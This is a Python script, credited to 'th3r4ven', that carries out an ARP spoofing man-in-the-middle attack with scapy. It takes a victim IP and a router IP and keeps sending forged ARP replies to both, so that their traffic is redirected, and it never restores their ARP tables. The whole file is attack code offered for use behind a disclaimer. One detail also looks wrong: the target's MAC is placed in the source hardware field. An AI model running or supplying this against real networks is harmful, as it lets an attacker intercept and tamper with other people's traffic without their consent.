#! /usr/bin/env python

#  Copyright (c) 2020.
#  This code was designed and created by TH3R4VEN, its use is encouraged for academic and professional purposes.
#  I am not responsible for improper or illegal uses
#  Follow me on GitHub: https://github.com/th3r4ven

import scapy.all as scapy
import argparse
import time


print("[+]\tARP Spoof (MITM Attack) made by th3r4ven")
parser = argparse.ArgumentParser()


def get_arguments():
    opt = argparse.ArgumentParser()
    opt.add_argument("-t", "--target", dest="target", help="Victim IP that is going to be spoofed.")
    opt.add_argument("-r", "--router", dest="router", help="Router IP address.")
    options = opt.parse_args()
    return options


def getmac(ip):
    arp = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_broadcast = broadcast/arp
    resp = scapy.srp(arp_broadcast, timeout=1, verbose=False)[0]

    return resp[0][1].hwsrc


def spoof(targetIP, spoofIP):
    targetMAC = getmac(targetIP)
    packet = scapy.ARP(op=2, pdst=targetIP, hwsrc=targetMAC, psrc=spoofIP)
    scapy.send(packet)


options = get_arguments()

if options.target and options.router:
    while True:
        spoof(options.target, options.router)
        spoof(options.router, options.target)
        time.sleep(2)
